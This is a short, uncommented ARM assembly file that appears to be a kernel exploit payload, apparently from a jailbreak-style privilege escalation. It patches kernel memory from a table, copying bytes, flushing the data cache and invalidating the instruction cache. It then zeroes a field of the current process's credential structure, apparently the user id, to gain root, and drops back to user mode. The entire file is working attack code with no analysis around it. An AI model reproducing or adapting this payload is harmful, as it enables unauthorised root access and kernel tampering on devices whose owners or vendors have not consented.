.syntax unified
.arm
start:
    mrc p15, 0, sp, c13, c0, 4
    ldr sp, [sp, #0x54]
    add sp, #0x3000

    ldrd r6, r7, count
    adr r5, stuff
pf_loop:

    ldm r5, {r0, r2}
    add r1, r5, #8
    bl _memcpy
    ldm r5, {r0, r1}
    mov r2, #0
    bl _flush_dcache
    ldm r5!, {r0, r1}
    add r5, r1
    mov r2, #0
    bl _invalidate_icache
    
    subs r6, #1
    bne pf_loop

    bl _current_proc
    bl _proc_unlock
    bl _current_proc
    bl _proc_ucred
    str r6, [r0, #0xc]
    
#ifdef __ARM_ARCH_7A__
    mov r5, #0x30
#else
    mov r5, #0x10
#endif
    msr spsr, r5 
    ldm r7!, {pc}^

count: .long 0
addr: .long 0
stuff:
